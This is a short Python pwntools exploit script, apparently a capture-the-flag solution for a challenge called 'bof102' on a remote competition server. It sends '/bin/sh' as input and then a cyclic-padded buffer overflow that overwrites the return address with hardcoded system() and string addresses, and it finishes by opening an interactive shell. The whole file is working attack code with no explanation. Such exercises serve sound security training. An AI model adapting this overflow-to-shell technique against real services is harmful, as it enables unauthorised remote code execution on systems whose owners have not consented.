#!/usr/bin/env python3

from pwn import *

#context.update(arch='i386', os='linux')
context.terminal= [ "tmux","splitw","-h"]

p = remote("bof102.sstf.site", 1337)

#p = process("./bof102")
#gdb.attach(p, gdbscript='''
#b main
#set follow-fork-mode parent''')

p.recvuntil("name?")
p.sendline("/bin/sh")
#cyclicNumber = cyclic_find(0x6161616a)
#payload = cyclic(cyclicNumber)
#payload += p32(0xf7c4c8a0) + cyclic(200)
systemAddr = 0x8048603
binshAddr = 0x804a06c

p.recvuntil("snowman?")
payload = cyclic(cyclic_find(0x61616166)) + p32(systemAddr) + p32(binshAddr)
p.sendline(payload)
print(p.recv())

p.interactive()
